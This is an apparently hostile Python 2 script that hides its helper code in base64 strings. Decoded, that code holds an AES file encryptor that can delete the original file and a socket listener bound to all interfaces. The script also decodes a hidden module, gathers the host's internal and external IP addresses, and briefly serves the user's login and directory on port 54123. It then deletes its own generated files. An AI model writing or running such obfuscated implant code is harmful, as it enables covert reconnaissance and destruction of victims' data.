import base64
import sys
import os 


def create_utils():
	needed_imports = {'Crypto.Random': 'get_random_bytes',
					  'Crypto.Cipher': 'AES'}
	header = 'import base64\nimport socket\nimport os\n'
	for lib in needed_imports.keys():
		header += 'from %s import %s\n' % (lib, needed_imports[lib])
	body = base64.b64decode('CkJTWj0xNjtQQUQ9J3snCnBhZD1sYW1iZGEgczogcyArIChCU1ogLSBsZW4ocykgJSBCU1opKlBBRAo=')
	enc = base64.b64decode('RW5jb2RlQUVTID0gbGFtYmRhIGMsIHM6IGJhc2U2NC5iNjRlbmNvZGUoYy5lbmNyeXB0KHBhZChzKSkpCg==')
	dec = base64.b64decode('RGVjb2RlQUVTID0gbGFtYmRhIGMsIGU6IGMuZGVjcnlwdChiYXNlNjQuYjY0ZGVjb2RlKGUpKS5yc3RyaXAoUEFEKQo=')
	srv = base64.b64decode('CmRlZiBzdGFydF9saXN0ZW5lcihwKToKCXRyeToKCQlzPXNvY2tldC5zb2NrZXQoc29ja2V0'\
		  'LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuYmluZCgoIjAuMC4wLjAiLHApKQo'\
		  'JZXhjZXB0IHNvY2tldC5lcnJvcjoKCQlyZXR1cm4gW10KCXJldHVybiBzCg==')
	rcv = base64.b64decode('CmRlZiBjcmVhdGVfc29ja2V0KCk6CglzPVtdCgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KHN'\
		  'vY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKCWV4Y2VwdCBzb2NrZXQuZ'\
		  'XJyb3I6CgkJcGFzcwoJcmV0dXJuIHMKCg==')
	hide = base64.b64decode('CmRlZiBmZW5jcnlwdChmbmFtZSxkZXN0cm95KToKCWlmIG5vdCBvcy5wYXRoLmlzZmlsZS'\
		   'hmbmFtZSk6CgkJZXhpdCgpCgllZmlsZT1mbmFtZS5zcGxpdCgiLyIpWy0xXS5zcGxpdCgi'\
		   'LiIpWzBdKyIubG9sIgoJY29udGVudD1vcGVuKGZuYW1lLCJyYiIpLnJlYWQoKQoJaz1nZX'\
		   'RfcmFuZG9tX2J5dGVzKDE2KTtvcGVuKGVmaWxlLCJ3YiIpLndyaXRlKEVuY29kZUFFUyhB'\
		   'RVMubmV3KGspLGNvbnRlbnQpKQoJb3BlbihmbmFtZS5zcGxpdCgiLyIpWy0xXS5zcGxpdC'\
		   'giLiIpWzBdKyIua2V5Iiwid2IiKS53cml0ZShiYXNlNjQuYjY0ZW5jb2RlKGspKQoJaWYg'\
		   'ZGVzdHJveToKCQlvcy5yZW1vdmUoZm5hbWUpCgo=')
	see = base64.b64decode('ZGVmIGZkZWNyeXB0KGZuYW1lKToKCWVuY2Q9b3BlbihmbmFtZSwicmIiKS5yZWFkKCkKCWtm'\
		  'PWZuYW1lLnNwbGl0KCIuIilbMF0rIi5rZXkiCglrPWJhc2U2NC5iNjRkZWNvZGUob3Blbihr'\
		  'ZiwicmIiKS5yZWFkKCkpCglyZXR1cm4gRGVjb2RlQUVTKEFFUy5uZXcoayksZW5jZCkKCg==')
	content = header+body+enc+dec+srv+rcv+hide+see
	open(os.getcwd()+'/utils.py', 'wb').write(content)


def decode_module(modfile):
	os.system('gunzip %s.b64.gz' % modfile)
	content = ''
	for chunk in open(modfile+'.b64','rb').readlines():
		content += base64.b64decode(chunk)+'\n'
	open('%s.py'%modfile,'wb').write(content)


def main():
	create_utils()
	import utils 
	decode_module('module')
	import module
	if module.nix:
		print 'UNIX system'
		curdir = module.pwd
		ext_ip = module.get_ext_ip()
		int_ip = module.get_internal_addr()
		print 'Current Dir:\t%s' % curdir
		print 'Internal IP:\t%s' % int_ip
		print 'External IP:\t%s' % ext_ip
	
		# Start a Simple Listening Webserver?
		bcmd = 'aW1wb3J0IHNvY2tldDsgc2VydmluZyA9IFRydWUKcyA9IHV0aWxzLnN0YXJ0X2xpc3RlbmVyKDU0MTIzKQpoID0'\
			   'IjxodG1sPlxuPHRpdGxlPiVzPC90aXRsZT5cbjxib2R5PjxoMT4lczwvaDE+IiAlIChvcy5nZXRsb2dpbigpLHB'\
			   '3ZCkKaDIgPSAiXG48aDE+JXM8L2gxPlxuPGgxPiVzPC9oMT5cbiIgJSAoaW50X2lwLCBleHRfaXApCmVuZCA9IC'\
			   'JcbjwvYm9keT5cbjwvaHRtbD4iCnBhZ2U9aCtoMitlbmQKdHJ5OgoJd2hpbGUgc2VydmluZzoKCQkJCWNsaWVud'\
			   'CwgY2FkZHIgPSBzLmFjY2VwdCgpCgkJY2xpZW5kLnNlbmQocGFnZSkKCQljbGllbnQuY2xvc2UoKQpleGNlcHQg'\
			   'S2V5Ym9hcmRJbnRlcnJ1cHQ6CglzZXJ2aW5nPUZhbHNlCnMuY2xvc2UoKQo='
		open('tmp.py','wb').write(base64.b64decode(bcmd))
		os.system('python tmp.py')
		os.remove('tmp.py')
	if module.dos:
		print 'Windows System'
	
	# cleanup 
	cleanup = ['module.py', 'utils.py', 'utils.pyc', 'module.pyc']
	for fobj in cleanup:
		os.remove(fobj)

if __name__ == '__main__':
	main()

